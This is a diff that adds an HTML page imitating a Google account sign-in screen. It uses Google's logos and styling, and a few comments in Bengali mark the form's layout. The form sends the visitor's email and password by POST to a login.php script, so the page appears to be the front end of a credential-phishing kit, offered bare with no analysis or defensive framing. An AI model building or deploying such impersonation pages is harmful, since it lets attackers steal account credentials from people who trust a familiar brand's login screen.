@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Sign in - Example Account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
+        body { background-color: #fff; color: #202124; font-size: 14px; line-height: 1.4286; }
+        .container { max-width: 100%; padding: 8px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .header { width: 100%; padding: 20px 0; text-align: right; }
+        .header a { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; padding: 10px 24px; }
+        .header a:hover { text-decoration: underline; }
+        .login-box { width: 100%; max-width: 450px; margin: 50px auto; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
+        .logo { margin-bottom: 16px; }
+        .logo img { width: 75px; height: 24px; }
+        h1 { font-size: 24px; font-weight: 400; line-height: 1.3333; margin-bottom: 8px; }
+        .subheader { font-size: 16px; font-weight: 400; color: #202124; margin-bottom: 24px; }
+        .input-container { width: 100%; margin-bottom: 24px; }
+        .form-input { width: 100%; height: 55px; padding: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; }
+        .form-input:hover { border-color: #d2d2d2; }
+        .form-input:focus { outline: none; border-color: #1a73e8; border-width: 2px; }
+        .forgot-email { margin-bottom: 24px; }
+        .forgot-email a { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
+        .forgot-email a:hover { text-decoration: underline; }
+        .button-container { display: flex; justify-content: space-between; align-items: center; width: 100%; }
+        .secondary-btn { background: transparent; color: #1a73e8; border: none; padding: 12px 24px; font-weight: 500; cursor: pointer; }
+        .primary-btn { background-color: #1a73e8; color: white; border: none; border-radius: 4px; padding: 12px 24px; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
+        .primary-btn:hover { background-color: #1b66c9; }
+        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
+        .language-selector { margin-top: 24px; font-size: 12px; }
+        @media (max-width: 500px) {
+            .login-box { border: none; padding: 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="google" width="150">
+        </div>
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/archive/c/c1/20230822192910%21Google_%22G%22_logo.svg" alt="Google G" />
+            </div>
+            <h1>Sign in</h1>
+            <div class="subheader">Use your email Account</div>
+
+            <!-- ✅ ফর্ম ট্যাগ শুরু -->
+            <form method="POST" action="login.php">
+                <div class="input-container">
+                    <input name="username" type="email" class="form-input" placeholder="Email or phone" id="email" />
+                </div>
+                <div class="input-container">
+                    <input name="password" type="password" class="form-input" placeholder="Enter your password" id="password" />
+                </div>
+                <div class="forgot-email">
+                    <a href="#">Forgot email?</a>
+                </div>
+                <div class="footer">
+                    Not your computer? Use Guest mode to sign in privately.
+                </div>
+                <div class="button-container">
+                    <button class="secondary-btn" type="button">Create account</button>
+                    <!-- ✅ সাবমিট বাটন ফর্মের ভিতরে -->
+                    <button class="primary-btn" type="submit">Next</button>
+                </div>
+            </form>
+            <!-- ✅ ফর্ম ট্যাগ শেষ -->
+        </div>
+        <div class="language-selector">
+            English (United States)
+        </div>
+    </div>
+</body>
+</html>
